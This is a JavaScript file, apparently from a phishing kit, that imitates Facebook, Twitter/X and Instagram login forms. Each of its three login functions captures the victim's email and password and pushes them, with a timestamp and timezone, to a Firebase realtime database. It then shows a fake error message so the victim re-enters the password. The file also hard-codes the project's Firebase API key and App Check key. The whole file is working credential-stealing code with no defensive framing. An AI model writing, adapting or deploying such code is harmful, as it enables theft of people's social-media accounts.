// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyCF1QXPm4rN0fmiPl2dRSIEHqKyk2e9SIE",
  authDomain: "desisupercon.firebaseapp.com",
  databaseURL: "https://desisupercon-default-rtdb.firebaseio.com",
  projectId: "desisupercon",
  storageBucket: "desisupercon.appspot.com",
  messagingSenderId: "958547183910",
  appId: "1:958547183910:web:c237cb1f5f774dd7d9d9e7"
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

function login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showError(error.message);
    });

  var email = document.getElementById("fb-email").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showError("Oops, something went wrong. Please try again later.");
      document.getElementById("fb-pass").value = "";
      return false;
    }, 2000);
  } else {
    showError("Please enter both email and password.");
  }
}

function twlogin() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showError(error.message);
    });

  var email = document.getElementById("tw-email").value;
  var password = document.getElementById("tw-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Twitter/X";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showError("Invalid username or password.");
      document.getElementById("tw-pass").value = "";
      return false;
    }, 2000);
  } else {
    showError("Please enter both email and password.");
  }
}

function iglog() {
  var email = document.getElementById("ig-uname").value.trim();
  var password = document.getElementById("ig-pass").value.trim();

  if (email === "" || password === "") {
    showError("Please enter both email and password.");
    return false; // Prevents further execution
  }

  // If inputs are valid, proceed with anonymous sign-in
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showError(error.message);
    });

  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Instagram";

  // Store the data in the Firebase database
  firebase.database().ref("fbdet").push({
    emle: email,
    mobile: "",
    time: currentTime,
    timezone: timezone,
    pass: password,
    date: currentDate,
    type: accountType,
  });

  // Simulate a delay and provide feedback
  setTimeout(function () {
    showError("Please double-check your password.");
    document.getElementById("ig-pass").value = ""; // Clear the password field
    return false; // Optionally prevent form submission if that's the goal
  }, 2000);
}

function showError(message) {
  alert(message);
}
